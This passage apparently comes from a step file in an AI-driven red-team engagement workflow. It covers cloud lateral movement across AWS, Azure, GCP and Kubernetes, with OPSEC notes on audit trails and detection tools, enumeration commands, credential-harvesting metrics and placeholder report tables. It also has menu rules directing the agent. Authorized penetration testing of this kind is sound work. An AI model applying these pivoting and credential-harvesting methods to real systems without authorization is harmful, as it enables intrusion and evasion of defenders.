| AWS → On-Prem | VPN/Direct Connect + AWS credentials with VPC access | Use AWS role to access VPN/DC resources, then pivot to on-prem |
| Azure → On-Prem | Azure AD Application Proxy, Azure Arc | Application Proxy connectors on-prem → access internal apps from cloud |

**Common credential sharing patterns:**
- Same SSH keys used across cloud instances and on-prem servers
- Shared database credentials between cloud RDS/Cloud SQL and on-prem databases
- API keys stored in multiple cloud provider secret stores
- Service mesh certificates shared across multi-cloud Kubernetes clusters
- CI/CD tools with credentials for all environments (Jenkins, GitLab CI, GitHub Actions)

**OPSEC considerations:**
- Cross-cloud pivots generate audit trails in BOTH providers
- OIDC token exchange creates distinctive log patterns in both identity providers
- Azure AD Connect abuse generates Azure AD audit logs + on-prem AD security events
- Multi-cloud CSPM tools (Wiz, Prisma Cloud) correlate findings across providers — cross-cloud movement may trigger unified alerts

**Document multi-cloud pivoting:**
```
| ID | Source Provider | Target Provider | Mechanism | Credential | Result | Bilateral Audit Trail |
|----|---------------|----------------|-----------|-----------|--------|----------------------|
| MC-001 | {{src_cloud}} | {{tgt_cloud}} | {{mechanism}} | {{cred}} | {{result}} | {{events_both_sides}} |
```

### 8. Post-Movement Validation

**For EACH successful cloud lateral movement, verify the new position:**

| Check | Command/Method | Purpose |
|-------|---------------|---------|
| Verify identity | `aws sts get-caller-identity` / `az account show` / `gcloud auth list` | Confirm new identity |
| Enumerate permissions | Provider-specific IAM enumeration | Map new access level |
| List accessible resources | `aws s3 ls` / `az resource list` / `gcloud compute instances list` | Assess new resource access |
| Check for additional pivot | Enumerate trusts/roles/SAs from new position | Identify further lateral paths |
| Credential lifetime | Check token expiry | Assess access stability |
| Security tool exposure | Check GuardDuty/Defender/SCC findings | Assess detection status |

**Update Cloud Access Map:**

| Provider | Account/Sub/Project | Identity | Access Level | Credential Type | TTL | Source Technique | Resources Accessible |
|----------|---------------------|----------|-------------|----------------|------|-----------------|---------------------|
| {{provider}} | {{account}} | {{identity}} | {{level}} | {{type}} | {{ttl}} | {{technique}} | {{resources}} |

### 9. Compile Cloud Lateral Movement Results & Present Menu

**Present results per provider:**

| Attempt | Provider | Technique | T-Code | Source→Target | Identity | Result | Audit Events |
|---------|----------|-----------|--------|---------------|----------|--------|-------------|
| CLD-001 | {{provider}} | {{technique}} | T{{code}} | {{src→tgt}} | {{identity}} | Success/Fail | {{events}} |
| CLD-002 | {{provider}} | {{technique}} | T{{code}} | {{src→tgt}} | {{identity}} | Success/Fail | {{events}} |

**Overall cloud lateral movement status:**
- Providers assessed: {{list}}
- Techniques attempted: {{count}}
- Successful lateral moves: {{count}}
- Accounts/subscriptions/projects reached: {{count}}
- Metadata services exploited: {{count}}
- Cross-account pivots: {{count}}
- Kubernetes clusters accessed: {{count}}
- Multi-cloud pivots: {{count}}
- Credentials harvested: {{count}}
- Audit trail entries generated: {{estimated_count}}

**Write findings under `## Cloud Lateral Movement`.**
**Update Cloud Access Map with all new positions.**
**Update frontmatter metrics.**

### 10. Present MENU OPTIONS

"**Cloud lateral movement assessment completed.**

Summary: {{technique_count}} techniques assessed across {{provider_count}} provider(s).
Successful Moves: {{success_count}} | Accounts Reached: {{account_count}} | Metadata Exploited: {{metadata_count}}
Cross-Account Pivots: {{pivot_count}} | K8s Clusters: {{k8s_count}} | Multi-Cloud Pivots: {{multi_cloud_count}}
All attempts logged with provider, identity, and audit trail events.

**Select an option:**
[A] Advanced Elicitation — Deep analysis of a specific cloud lateral path (cross-account role chains, metadata exploitation depth, K8s pivot analysis, multi-cloud trust chain mapping)
[W] War Room — Red (unexploited cross-account trusts, multi-cloud pivot strategies, credential lifetime exploitation, K8s RBAC escalation chains) vs Blue (cloud-native detection: GuardDuty/Defender/SCC alert analysis, CloudTrail/Activity Log/Audit Log correlation, CSPM finding review, K8s audit log analysis)
[C] Continue — Proceed to Network Pivoting & Tunneling (Step 8 of 10)"

#### Menu Handling Logic:

- IF A: Deep analysis — explore specific cloud lateral paths in depth. Analyze cross-account role chains for missed pivot opportunities. Map metadata service exploitation across all instances. Evaluate Kubernetes RBAC for escalation within clusters. Trace multi-cloud trust chains for transitive access. Assess credential lifetime windows for time-sensitive operations. Process insights, ask user if they want to refine approach, if yes iterate and redisplay menu, if no redisplay menu
- IF W: War Room — Red Team perspective: what cross-account trusts weren't exploited? Can role chains be extended for deeper access? Are there unused metadata service credentials on other instances? Can K8s service accounts be chained for cluster-admin? What multi-cloud trust relationships enable cross-provider pivots? Blue Team perspective: what CloudTrail/Activity Log/Audit Log events correlate this campaign? What GuardDuty/Defender for Cloud/SCC findings triggered? What CSPM tools would flag cross-account anomalies? What K8s audit log patterns indicate lateral movement? What cloud-native SIEM rules would catch multi-cloud pivots? Summarize insights, redisplay menu
- IF C: Update output file frontmatter adding this step name to stepsCompleted, then read fully and follow: `./step-08-network-pivoting.md`
- IF user asks questions: Answer and redisplay menu

#### EXECUTION RULES:

- ALWAYS halt and wait for user input after presenting menu
- ONLY proceed to next step when user selects 'C'
- After other menu item execution, return to this menu

## CRITICAL STEP COMPLETION NOTE

ONLY WHEN [C continue option] is selected and [frontmatter properly updated with this step added to stepsCompleted and Cloud Lateral Movement section populated], will you then read fully and follow: `./step-08-network-pivoting.md` to begin network pivoting and tunneling.

---

## SYSTEM SUCCESS/FAILURE METRICS

### SUCCESS:

- Cloud provider(s) identified and security monitoring tools assessed before any lateral movement
- All applicable provider-specific lateral movement paths assessed systematically
- AWS: cross-account role assumption, EC2/Lambda/ECS/EKS pivoting, metadata service, Organizations traversal assessed
- Azure: managed identity abuse, Automation/Function App pivoting, Azure AD app abuse, subscription pivoting, Key Vault access assessed
- GCP: service account impersonation, Compute/GKE pivoting, cross-project access, Cloud Functions assessed
- Kubernetes-specific lateral movement assessed across all identified clusters (EKS/AKS/GKE)
- Multi-cloud pivoting assessed for all identified cross-provider trust relationships
- On-prem to cloud bridges (Azure AD Connect, AWS SSO, GCP Workforce Identity) assessed
- Every attempt logged with provider, technique, identity, result, and audit trail events
- Credential lifetimes tracked and operations planned within token windows
- Post-movement validation performed for every new cloud position
- Cloud Access Map updated with all new positions
- Findings appended to report under `## Cloud Lateral Movement`

### SYSTEM FAILURE:

- Attempting cloud API calls without understanding the logging implications — EVERY call is logged
- Cross-account/subscription/project pivoting without verifying target is in RoE scope
- Not assessing cloud security monitoring tools (GuardDuty, Defender, SCC) before high-profile actions
- Using instance credentials outside the instance without understanding GuardDuty credential exfiltration detection
- Not tracking credential lifetimes — operations failing due to expired tokens
- Skipping metadata service checks when instance-level access exists
- Not identifying all cloud providers in a multi-cloud environment
- Not assessing Kubernetes clusters for lateral movement when container orchestration exists
- Not documenting audit trail events generated per technique
- Running automated tools (Pacu, ScoutSuite) without understanding their logging footprint
- Proceeding without user selecting 'C' (Continue)

**Master Rule:** Skipping steps, optimizing sequences, or not following exact instructions is FORBIDDEN and constitutes SYSTEM FAILURE. Every technique logged, every provider identified, every audit trail entry documented, every credential lifetime tracked. Cloud APIs log everything — operate with full awareness.
